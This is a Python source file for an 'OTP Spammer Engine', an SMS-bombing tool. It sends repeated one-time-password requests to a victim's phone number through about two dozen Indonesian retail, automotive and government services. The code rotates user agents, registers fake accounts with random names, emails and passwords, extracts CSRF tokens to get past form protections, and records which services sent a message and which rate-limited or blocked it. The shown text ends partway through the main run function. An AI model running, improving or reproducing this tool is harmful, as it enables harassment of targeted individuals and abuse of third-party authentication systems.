#!/usr/bin/env python3
# main_engine.py - OTP Spammer Engine (FULL FIXED)

import requests
import uuid
import random
import string
import time
import re
import json
import threading
import sys
import signal
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed

from license import (
    log_info, log_success, log_warning, log_error, log_input, 
    RATE_LIMIT_KEYWORDS, get_active_apis, is_admin_number
)
from utils import normalize, fmt_08, fmt_nocode, fmt_plus, fmt_phone_only, get_public_ip, generate_multipart, extract_csrf, get_random_user_agent, get_headers_with_random_ua

# ==================== IMPORT HANDLERS ====================
from handlers import (
    send_tuneup_otp, send_hashmicro_otp, send_internetrakyat_otp,
    send_ultramilk_otp, send_kaniva_otp, send_jembatani_otp,
    send_rcx_otp, send_sahabat_otp, send_auto2000_otp,
    send_astra_otp, send_royalcanin_otp, send_watsons_otp,
    send_99co_otp, send_belirumah_otp, send_fastwork_otp,
    send_hrsbre_otp, send_erafone_otp, send_beautyhaul_otp,
    send_hainaya_otp, send_minumyukkaka_otp, send_sidemang_otp,
    send_lapormasbup_otp, send_ptspkemenag_otp, send_planetban_otp
)

from targets import TARGETS

print_lock = threading.Lock()
stop_flag = False

def log_target(idx, total, name, status, detail=""):
    with print_lock:
        if status == "SUCCESS":
            sym, col = "+", Fore.GREEN
        elif status == "LIMITED" or status == "BLOCKED":
            sym, col = "!", Fore.YELLOW
        else:
            sym, col = "-", Fore.RED
        print(f"{col}[{sym}]{Style.RESET_ALL} ({idx}/{total}) {name}: {status}" + (f" - {detail}" if detail else ""))

def process_target(api, target62, ip, idx, total):
    global stop_flag
    if stop_flag:
        return False
        
    name = api['name']
    status_text = "FAIL"
    detail = ""
    success = False

    try:
        session = requests.Session()
        session.headers.update(get_headers_with_random_ua())

        # ==================== PLANETBAN KHUSUS ====================
        if name == 'PlanetBan':
            number_08 = api['number_fmt'](target62)
            resp = send_planetban_otp(number_08)
            if resp is not None:
                if resp.status_code == 200:
                    status_text = "SUCCESS"
                    detail = "OTP sent"
                    success = True
                elif resp.status_code == 429:
                    status_text = "LIMITED"
                    detail = "Rate limit"
                else:
                    detail = f"({resp.status_code})"
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== JEMBATANI (3 argumen) ====================
        if api.get('post_type') == 'jembatani':
            number_08 = api['number_fmt'](target62)
            rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase+string.digits, k=4))
            jemb_pass = "Test@" + ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + "#1"
            resp = send_jembatani_otp(number_08, rand_name, jemb_pass)
            if resp is not None:
                if isinstance(resp, tuple):
                    code, text = resp
                    if code and code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({code}) {str(text)[:60] if text else ''}"
                elif hasattr(resp, 'status_code'):
                    if resp.status_code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({resp.status_code}) {resp.text[:60] if resp.text else ''}"
                else:
                    status_text = "SUCCESS" if resp else "FAIL"
                    success = True if resp else False
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== RCX (3 argumen) ====================
        if api.get('post_type') == 'rcx':
            number_08 = api['number_fmt'](target62)
            rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase+string.digits, k=4))
            rand_email = f'user{random.randint(1000,9999)}@mailnesia.com'
            resp = send_rcx_otp(number_08, rand_name, rand_email)
            if resp is not None:
                if isinstance(resp, tuple):
                    code, text = resp
                    if code and code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP triggered"
                        success = True
                    else:
                        detail = f"({code}) {str(text)[:60] if text else ''}"
                elif hasattr(resp, 'status_code'):
                    if resp.status_code == 302 or resp.status_code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP triggered"
                        success = True
                    else:
                        detail = f"({resp.status_code}) {resp.text[:60] if resp.text else ''}"
                else:
                    status_text = "SUCCESS" if resp else "FAIL"
                    success = True if resp else False
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== KANIVA (2 argumen) ====================
        if api.get('post_type') == 'kaniva':
            number_08 = api['number_fmt'](target62)
            rand_name = 'User' + ''.join(random.choices(string.ascii_lowercase+string.digits, k=4))
            resp = send_kaniva_otp(number_08, rand_name)
            if resp is not None:
                if isinstance(resp, tuple):
                    code, text = resp
                    if code and code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({code}) {str(text)[:60] if text else ''}"
                elif hasattr(resp, 'status_code'):
                    if resp.status_code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({resp.status_code}) {resp.text[:60] if resp.text else ''}"
                else:
                    status_text = "SUCCESS" if resp else "FAIL"
                    success = True if resp else False
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== TUNEUP ====================
        if api.get('post_type') == 'tuneup':
            number_for_tuneup = api['number_fmt'](target62)
            resp = send_tuneup_otp(number_for_tuneup)
            if resp is not None:
                text = resp.text.lower()
                keywords = api.get('success_on', [])
                is_success = any(kw in text for kw in keywords)
                is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
                if is_success:
                    status_text = "SUCCESS"
                    detail = "OTP sent"
                    success = True
                elif is_rate_limit:
                    status_text = "LIMITED"
                    detail = text[:60]
                else:
                    detail = f"({resp.status_code}) {text[:60]}"
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== HASHMICRO ====================
        if api.get('post_type') == 'hashmicro':
            number = api['number_fmt'](target62)
            final_headers = dict(api.get('headers', {}))
            final_headers['User-Agent'] = get_random_user_agent()
            form_data = send_hashmicro_otp(number)
            if form_data is not None:
                payload_str = '&'.join([f"{k}={requests.utils.quote(str(v))}" for k, v in form_data.items()])
                resp = session.post(api['url'], headers=final_headers, data=payload_str, timeout=15)
                if resp is not None:
                    text = resp.text.lower()
                    keywords = api.get('success_on', [])
                    is_success = any(kw in text for kw in keywords) or resp.status_code == 200
                    is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
                    if is_success:
                        status_text = "SUCCESS"
                        detail = "OK"
                        success = True
                    elif is_rate_limit:
                        status_text = "LIMITED"
                        detail = text[:60]
                    else:
                        detail = f"({resp.status_code}) {text[:60]}"
                else:
                    status_text = "ERROR"
                    detail = "No response"
            else:
                status_text = "ERROR"
                detail = "HashMicro payload failed"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== INTERNET RAKYAT ====================
        if api.get('post_type') == 'internetrakyat':
            phone_08 = api['number_fmt'](target62)
            resp = send_internetrakyat_otp(phone_08)
            if resp is not None:
                try:
                    data = resp.json()
                    if data.get("statusCode") == 200 and data.get("message") == "OTP terkirim":
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = data.get("message", "")[:60]
                except:
                    detail = resp.text[:60]
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== ULTRAMILK ====================
        if api.get('post_type') == 'ultramilk':
            resp = send_ultramilk_otp(target62)
            if resp is not None:
                if isinstance(resp, tuple):
                    code, text = resp
                    if code and code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({code}) {str(text)[:60] if text else ''}"
                elif hasattr(resp, 'status_code'):
                    if resp.status_code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({resp.status_code}) {resp.text[:60] if resp.text else ''}"
                else:
                    status_text = "SUCCESS" if resp else "FAIL"
                    success = True if resp else False
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== SAHABAT TEKNISI ====================
        if api.get('post_type') == 'sahabatteknisi':
            number_08 = api['number_fmt'](target62)
            resp = send_sahabat_otp(number_08)
            if resp is not None:
                if isinstance(resp, tuple):
                    code, text = resp
                    if code and code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({code}) {str(text)[:60] if text else ''}"
                elif hasattr(resp, 'status_code'):
                    if resp.status_code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({resp.status_code}) {resp.text[:60] if resp.text else ''}"
                else:
                    status_text = "SUCCESS" if resp else "FAIL"
                    success = True if resp else False
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== AUTO2000 ====================
        if api.get('post_type') == 'auto2000':
            number_08 = api['number_fmt'](target62)
            resp = send_auto2000_otp(number_08)
            if resp is not None:
                if isinstance(resp, tuple):
                    code, text = resp
                    if code and code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({code}) {str(text)[:60] if text else ''}"
                elif hasattr(resp, 'status_code'):
                    if resp.status_code == 200:
                        try:
                            data = resp.json()
                            ack = data.get("acknowledge", 0)
                            msg = data.get("message", "")
                            if ack == 1 and msg == "success":
                                status_text = "SUCCESS"
                                detail = "OTP sent"
                                success = True
                            elif "resend in" in msg.lower():
                                match = re.search(r'resend in (\d+) s', msg)
                                sec = match.group(1) if match else "?"
                                detail = f"Limit: retry after {sec}s"
                                status_text = "LIMITED"
                            else:
                                detail = f"message: {msg[:60]}"
                        except:
                            detail = resp.text[:60]
                    elif resp.status_code == 403:
                        status_text = "BLOCKED"
                        detail = "Cloudflare 403"
                    else:
                        detail = f"({resp.status_code}) {resp.text[:60]}"
                else:
                    status_text = "SUCCESS" if resp else "FAIL"
                    success = True if resp else False
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== ASTRA DAIHATSU ====================
        if api.get('post_type') == 'astra_daihatsu':
            number_62 = api['number_fmt'](target62)
            resp = send_astra_otp(number_62)
            if resp is not None:
                if isinstance(resp, tuple):
                    code, text = resp
                    if code and code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({code}) {str(text)[:60] if text else ''}"
                elif hasattr(resp, 'status_code'):
                    if resp.status_code == 200:
                        try:
                            data = resp.json()
                            msg = data.get("message", "")
                            ack = data.get("acknowledge", 0)
                            if ack == 1 and "OTP Success" in msg:
                                if "still valid" not in msg.lower():
                                    status_text = "SUCCESS"
                                    detail = "OTP sent"
                                    success = True
                                else:
                                    status_text = "LIMITED"
                                    detail = "OTP still valid"
                            else:
                                detail = msg[:60]
                        except:
                            detail = resp.text[:60]
                    else:
                        detail = f"({resp.status_code}) {resp.text[:60]}"
                else:
                    status_text = "SUCCESS" if resp else "FAIL"
                    success = True if resp else False
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== ROYAL CANIN ====================
        if api.get('post_type') == 'royal_canin':
            phone_plus = api['number_fmt'](target62)
            resp = send_royalcanin_otp(phone_plus)
            if resp is not None:
                if isinstance(resp, tuple):
                    code, text = resp
                    if code and code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({code}) {str(text)[:60] if text else ''}"
                elif hasattr(resp, 'status_code'):
                    if resp.status_code == 200:
                        try:
                            data = resp.json()
                            result = data.get("result", {})
                            if result.get("ReturnStatus") == 1:
                                status_text = "SUCCESS"
                                detail = "OTP sent"
                                success = True
                            else:
                                detail = result.get("ReturnMessage", "")[:60]
                        except:
                            detail = resp.text[:60]
                    else:
                        detail = f"({resp.status_code}) {resp.text[:60]}"
                else:
                    status_text = "SUCCESS" if resp else "FAIL"
                    success = True if resp else False
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== WATSONS ====================
        if api.get('post_type') == 'watsons':
            phone_no_code = api['number_fmt'](target62)
            resp = send_watsons_otp(phone_no_code)
            if resp is not None:
                if isinstance(resp, tuple):
                    code, text = resp
                    if code and code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({code}) {str(text)[:60] if text else ''}"
                elif hasattr(resp, 'status_code'):
                    if resp.status_code == 200:
                        try:
                            data = resp.json()
                            if "token" in data:
                                status_text = "SUCCESS"
                                detail = "OTP sent"
                                success = True
                            else:
                                detail = f"Response: {str(data)[:60]}"
                        except:
                            detail = resp.text[:60]
                    else:
                        detail = f"({resp.status_code}) {resp.text[:60]}"
                        if resp.status_code == 429:
                            status_text = "LIMITED"
                else:
                    status_text = "SUCCESS" if resp else "FAIL"
                    success = True if resp else False
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== 99.CO ====================
        if api.get('post_type') == '99co':
            phone_plus = api['number_fmt'](target62)
            resp = send_99co_otp(phone_plus)
            if resp is not None:
                if isinstance(resp, tuple):
                    code, text = resp
                    if code and code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({code}) {str(text)[:60] if text else ''}"
                elif hasattr(resp, 'status_code'):
                    text = resp.text.lower()
                    keywords = api.get('success_on', [])
                    is_success = any(kw in text for kw in keywords) or resp.status_code == 200
                    is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
                    if is_success:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    elif is_rate_limit:
                        status_text = "LIMITED"
                        detail = text[:60]
                    else:
                        detail = f"({resp.status_code}) {text[:60]}"
                else:
                    status_text = "SUCCESS" if resp else "FAIL"
                    success = True if resp else False
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== BELIRUMAH ====================
        if api.get('post_type') == 'belirumahco':
            phone_plus = api['number_fmt'](target62)
            resp = send_belirumah_otp(phone_plus)
            if resp is not None:
                if isinstance(resp, tuple):
                    code, text = resp
                    if code and code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({code}) {str(text)[:60] if text else ''}"
                elif hasattr(resp, 'status_code'):
                    text = resp.text.lower()
                    keywords = api.get('success_on', [])
                    is_success = any(kw in text for kw in keywords) or resp.status_code == 200
                    is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
                    if is_success:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    elif is_rate_limit:
                        status_text = "LIMITED"
                        detail = text[:60]
                    else:
                        detail = f"({resp.status_code}) {text[:60]}"
                else:
                    status_text = "SUCCESS" if resp else "FAIL"
                    success = True if resp else False
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== FASTWORK ====================
        if api.get('post_type') == 'fastworkid':
            number_08 = api['number_fmt'](target62)
            resp = send_fastwork_otp(number_08)
            if resp is not None:
                if isinstance(resp, tuple):
                    code, text = resp
                    if code and code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({code}) {str(text)[:60] if text else ''}"
                elif hasattr(resp, 'status_code'):
                    text = resp.text.lower()
                    keywords = api.get('success_on', [])
                    is_success = any(kw in text for kw in keywords) or resp.status_code == 200
                    is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
                    if is_success:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    elif is_rate_limit:
                        status_text = "LIMITED"
                        detail = text[:60]
                    else:
                        detail = f"({resp.status_code}) {text[:60]}"
                else:
                    status_text = "SUCCESS" if resp else "FAIL"
                    success = True if resp else False
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== HRS-BRE ====================
        if api.get('post_type') == 'hrsbre':
            number_08 = api['number_fmt'](target62)
            result = send_hrsbre_otp(number_08)
            if result is not None:
                if isinstance(result, tuple) and len(result) >= 2:
                    code, text = result[0], result[1]
                    if code and code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({code}) {str(text)[:60] if text else ''}"
                else:
                    status_text = "SUCCESS" if result else "FAIL"
                    success = True if result else False
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== ERAFONE ====================
        if api.get('post_type') == 'erafone':
            number_normal = api['number_fmt'](target62)
            result = send_erafone_otp(number_normal)
            if result is not None:
                if isinstance(result, tuple) and len(result) >= 2:
                    code, resp = result[0], result[1]
                    if code == 200:
                        if isinstance(resp, dict) and resp.get("message") == "Success Request OTP":
                            status_text = "SUCCESS"
                            detail = "OTP sent"
                            success = True
                        else:
                            detail = f"({code}) {str(resp)[:60]}"
                    else:
                        detail = f"({code}) {str(resp)[:60]}"
                        if code == 429:
                            status_text = "LIMITED"
                else:
                    status_text = "SUCCESS" if result else "FAIL"
                    success = True if result else False
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== BEAUTYHAUL ====================
        if api.get('post_type') == 'beautyhaul':
            local_number = api['number_fmt'](target62)
            resp = send_beautyhaul_otp(local_number)
            if resp is not None:
                if isinstance(resp, tuple):
                    code, text = resp
                    if code and code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({code}) {str(text)[:60] if text else ''}"
                elif hasattr(resp, 'status_code'):
                    text = resp.text.lower()
                    keywords = api.get('success_on', [])
                    is_success = any(kw in text for kw in keywords) or resp.status_code == 200
                    is_rate_limit = (resp.status_code == 429) or any(kw in text for kw in RATE_LIMIT_KEYWORDS)
                    if is_success:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    elif is_rate_limit:
                        status_text = "LIMITED"
                        detail = text[:60]
                    else:
                        detail = f"({resp.status_code}) {text[:60]}"
                else:
                    status_text = "SUCCESS" if resp else "FAIL"
                    success = True if resp else False
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== HAINAYA ====================
        if api.get('post_type') == 'hainaya':
            phone_for_api = api['number_fmt'](target62)
            resp = send_hainaya_otp(phone_for_api)
            if resp is not None:
                if isinstance(resp, tuple):
                    code, text = resp
                    if code and code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({code}) {str(text)[:60] if text else ''}"
                elif hasattr(resp, 'status_code'):
                    status_code = resp.status_code
                    try:
                        data = resp.json()
                        text = resp.text.lower()
                    except:
                        data = {}
                        text = resp.text.lower()
                    if status_code == 201:
                        if data.get('tenant_id'):
                            status_text = "SUCCESS"
                            detail = "OTP sent (register)"
                            success = True
                        else:
                            detail = "201 no tenant_id"
                    elif status_code == 200:
                        if data.get('session_id') or data.get('message'):
                            status_text = "SUCCESS"
                            detail = "OTP sent (login)"
                            success = True
                        else:
                            detail = f"200: {str(data)[:60]}"
                    elif status_code == 409:
                        status_text = "SUCCESS"
                        detail = "OTP sent (already registered)"
                        success = True
                    elif status_code == 429:
                        status_text = "LIMITED"
                        detail = "Rate limit"
                    else:
                        keywords = api.get('success_on', [])
                        is_success = any(kw in text for kw in keywords)
                        if is_success:
                            status_text = "SUCCESS"
                            detail = "OTP sent"
                            success = True
                        else:
                            detail = f"({status_code}) {str(data)[:60] if data else text[:60]}"
                else:
                    status_text = "SUCCESS" if resp else "FAIL"
                    success = True if resp else False
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== MINUMYUKKAKA ====================
        if api.get('post_type') == 'minumyukkaka':
            phone_08 = api['number_fmt'](target62)
            resp = send_minumyukkaka_otp(phone_08)
            if resp is not None:
                if isinstance(resp, tuple):
                    code, text = resp
                    if code and code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({code}) {str(text)[:60] if text else ''}"
                elif hasattr(resp, 'status_code'):
                    status_code = resp.status_code
                    try:
                        data = resp.json()
                        text = resp.text.lower()
                    except:
                        data = {}
                        text = resp.text.lower()
                    if status_code == 200:
                        if data.get('IsSuccess') == True:
                            status_text = "SUCCESS"
                            detail = "OTP sent"
                            success = True
                        else:
                            error_msg = data.get('Message', 'Unknown error')
                            if 'rate' in error_msg.lower() or 'limit' in error_msg.lower():
                                status_text = "LIMITED"
                                detail = error_msg[:60]
                            else:
                                detail = f"Error: {error_msg[:60]}"
                    elif status_code == 429:
                        status_text = "LIMITED"
                        detail = "Rate limit"
                    else:
                        keywords = api.get('success_on', [])
                        is_success = any(kw in text for kw in keywords)
                        if is_success:
                            status_text = "SUCCESS"
                            detail = "OTP sent"
                            success = True
                        else:
                            detail = f"({status_code}) {str(data)[:60] if data else text[:60]}"
                else:
                    status_text = "SUCCESS" if resp else "FAIL"
                    success = True if resp else False
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== SIDEMANG ====================
        if api.get('post_type') == 'sidemang':
            phone_08 = api['number_fmt'](target62)
            resp = send_sidemang_otp(phone_08)
            if resp is not None:
                if isinstance(resp, tuple):
                    code, text = resp
                    if code and code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({code}) {str(text)[:60] if text else ''}"
                elif hasattr(resp, 'status_code'):
                    status_code = resp.status_code
                    try:
                        data = resp.json()
                        text = resp.text.lower()
                    except:
                        data = {}
                        text = resp.text.lower()
                    if status_code == 200:
                        if data.get('otpDispatched') == True:
                            status_text = "SUCCESS"
                            detail = "OTP sent"
                            success = True
                        else:
                            error_msg = data.get('message', 'Unknown error')
                            detail = f"Error: {error_msg[:60]}"
                    elif status_code == 429:
                        status_text = "LIMITED"
                        detail = "Rate limit"
                    elif status_code == 400:
                        error_msg = data.get('message', 'Bad Request')
                        detail = f"Error: {error_msg[:60]}"
                    else:
                        keywords = api.get('success_on', [])
                        is_success = any(kw in text for kw in keywords)
                        if is_success:
                            status_text = "SUCCESS"
                            detail = "OTP sent"
                            success = True
                        else:
                            detail = f"({status_code}) {str(data)[:60] if data else text[:60]}"
                else:
                    status_text = "SUCCESS" if resp else "FAIL"
                    success = True if resp else False
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== LAPORMASBUP ====================
        if api.get('post_type') == 'lapormasbup':
            phone_08 = api['number_fmt'](target62)
            resp, is_resend = send_lapormasbup_otp(phone_08)
            if resp is not None:
                if isinstance(resp, tuple):
                    code, text = resp
                    if code and code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent" + (" (resend)" if is_resend else " (register)")
                        success = True
                    else:
                        detail = f"({code}) {str(text)[:60] if text else ''}"
                elif hasattr(resp, 'status_code'):
                    status_code = resp.status_code
                    try:
                        data = resp.json()
                        text = resp.text.lower()
                    except:
                        data = {}
                        text = resp.text.lower()
                    if status_code == 200:
                        if 'user' in data and 'warga_id' in data['user']:
                            status_text = "SUCCESS"
                            detail = "OTP sent" + (" (resend)" if is_resend else " (register)")
                            success = True
                        elif data.get('message') and 'berhasil' in data.get('message', '').lower():
                            status_text = "SUCCESS"
                            detail = "OTP sent" + (" (resend)" if is_resend else " (register)")
                            success = True
                        else:
                            detail = f"Response: {str(data)[:60]}"
                    elif status_code == 400:
                        error_msg = data.get('error', data.get('message', 'Bad Request'))
                        if 'verifikasi' in error_msg.lower():
                            status_text = "SUCCESS"
                            detail = "OTP sent (auto-resend)"
                            success = True
                        else:
                            detail = f"Error: {error_msg[:60]}"
                    elif status_code == 429:
                        status_text = "LIMITED"
                        detail = "Rate limit"
                    else:
                        keywords = api.get('success_on', [])
                        is_success = any(kw in text for kw in keywords)
                        if is_success:
                            status_text = "SUCCESS"
                            detail = "OTP sent" + (" (resend)" if is_resend else " (register)")
                            success = True
                        else:
                            detail = f"({status_code}) {str(data)[:60] if data else text[:60]}"
                else:
                    status_text = "SUCCESS" if resp else "FAIL"
                    success = True if resp else False
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== PTSP KEMENAG ====================
        if api.get('post_type') == 'ptspkemenag':
            phone_08 = api['number_fmt'](target62)
            resp = send_ptspkemenag_otp(phone_08)
            if resp is not None:
                if isinstance(resp, tuple):
                    code, text = resp
                    if code and code < 400:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        detail = f"({code}) {str(text)[:60] if text else ''}"
                elif hasattr(resp, 'status_code'):
                    status_code = resp.status_code
                    try:
                        data = resp.json()
                        text = resp.text.lower()
                    except:
                        data = {}
                        text = resp.text.lower()
                    if status_code == 200 or status_code == 201:
                        if data.get('success') == True:
                            status_text = "SUCCESS"
                            detail = "OTP sent"
                            success = True
                        elif 'user' in data or 'data' in data:
                            status_text = "SUCCESS"
                            detail = "OTP sent"
                            success = True
                        else:
                            detail = f"Response: {str(data)[:60]}"
                    elif status_code == 400:
                        error_msg = data.get('message', 'Bad Request')
                        detail = f"Error: {error_msg[:60]}"
                    elif status_code == 409:
                        status_text = "LIMITED"
                        detail = "Already registered"
                    elif status_code == 429:
                        status_text = "LIMITED"
                        detail = "Rate limit"
                    else:
                        keywords = api.get('success_on', [])
                        is_success = any(kw in text for kw in keywords)
                        if is_success:
                            status_text = "SUCCESS"
                            detail = "OTP sent"
                            success = True
                        else:
                            detail = f"({status_code}) {str(data)[:60] if data else text[:60]}"
                else:
                    status_text = "SUCCESS" if resp else "FAIL"
                    success = True if resp else False
            else:
                status_text = "ERROR"
                detail = "No response"
            log_target(idx, total, name, status_text, detail)
            return success

        # ==================== DEFAULT (JSON / MULTIPART) ====================
        referer = api.get('referer', '').replace('{raw}', target62)
        if referer:
            try: session.get(referer, timeout=8)
            except: pass
        number = api['number_fmt'](target62)
        final_headers = {}
        for hk, hv in api.get('headers', {}).items():
            if isinstance(hv, str):
                hv = hv.replace('{raw}', target62).replace('{number}', str(number))
            final_headers[hk] = hv
        final_headers['User-Agent'] = get_random_user_agent()
        ptype = api.get('post_type', 'json')
        resp = None
        
        try:
            if ptype == 'json':
                payload_str = api['payload'].replace('{number}', str(number))\
                    .replace('{rand}', str(uuid.uuid4()))\
                    .replace('{ip}', ip)\
                    .replace('{raw}', target62)\
                    .replace('{name}', 'User'+str(random.randint(100,999)))\
                    .replace('{email}', f'user{random.randint(1000,9999)}@mailnesia.com')\
                    .replace('{pw}', 'Pass'+''.join(random.choices(string.ascii_letters+string.digits, k=6))+'@1')\
                    .replace('{uuid_val}', str(uuid.uuid4()))\
                    .replace('{device_id}', str(uuid.uuid4()))\
                    .replace('{recaptcha}', '')
                resp = session.post(api['url'], headers=final_headers, data=payload_str, timeout=12)
            elif ptype == 'multipart':
                form = {
                    'name': 'User'+str(random.randint(100,999)),
                    'sex': '1',
                    'birth_date': f"{random.randint(1980,2007)}-{random.randint(1,12):02d}-{random.randint(1,28):02d}",
                    'mobile_number': number,
                    'password': 'Pass'+''.join(random.choices(string.ascii_letters+string.digits, k=6))+'@1',
                    'repassword': 'Pass'+''.join(random.choices(string.ascii_letters+string.digits, k=6))+'@1',
                }
                boundary = '----WebKitFormBoundary' + str(uuid.uuid4()).replace('-', '')[:16]
                final_headers['Content-Type'] = f'multipart/form-data; boundary={boundary}'
                body = generate_multipart(form, boundary)
                resp = session.post(api['url'], headers=final_headers, data=body, timeout=12)
            elif ptype == 'resend_otp':
                csrf_token = None
                try:
                    r_csrf = session.get('https://www.hollandbakery.co.id/users/verify_token', timeout=8)
                    csrf_token = extract_csrf(r_csrf.text)
                    if not csrf_token:
                        r_csrf = session.get('https://www.hollandbakery.co.id/login-phone', timeout=8)
                        csrf_token = extract_csrf(r_csrf.text)
                except: pass
                payload = {'phone': number, 'verify-submit': 'Resend+Code+OTP'}
                if csrf_token:
                    payload['csrf_token'] = csrf_token
                    final_headers['X-CSRF-TOKEN'] = csrf_token
                resp = session.post(api['url'], headers=final_headers, data=payload, allow_redirects=False, timeout=12)
            else:
                final_headers['User-Agent'] = get_random_user_agent()
                resp = session.post(api['url'], headers=final_headers, timeout=12)
        except Exception as e:
            resp = None

        if resp is not None:
            status_code = resp.status_code
            
            if status_code in [200, 201]:
                status_text = "SUCCESS"
                detail = "OTP sent"
                success = True
            elif status_code in [302, 303]:
                status_text = "SUCCESS"
                detail = "OTP triggered"
                success = True
            elif status_code == 429:
                status_text = "LIMITED"
                detail = "Rate limit"
            elif status_code == 403:
                status_text = "BLOCKED"
                detail = "Forbidden"
            elif status_code == 404:
                status_text = "FAIL"
                detail = "API not found"
            elif status_code >= 500:
                status_text = "FAIL"
                detail = f"Server error ({status_code})"
            else:
                try:
                    text = resp.text.lower() if resp.text else ""
                    keywords = api.get('success_on', [])
                    is_success = any(kw in text for kw in keywords)
                    if is_success:
                        status_text = "SUCCESS"
                        detail = "OTP sent"
                        success = True
                    else:
                        status_text = "FAIL"
                        detail = f"({status_code})"
                except:
                    status_text = "FAIL"
                    detail = f"({status_code})"
        else:
            status_text = "ERROR"
            detail = "No response"

    except Exception as e:
        status_text = "ERROR"
        detail = str(e)[:40]

    log_target(idx, total, name, status_text, detail)
    return success

# ==================== FUNGSI UTAMA ====================
def run_single_round(threads=1):
    global stop_flag
    stop_flag = False
    
    log_info(f"Menjalankan Single Round dengan {threads} thread...")
    
    total_apis = get_active_apis()
    print()
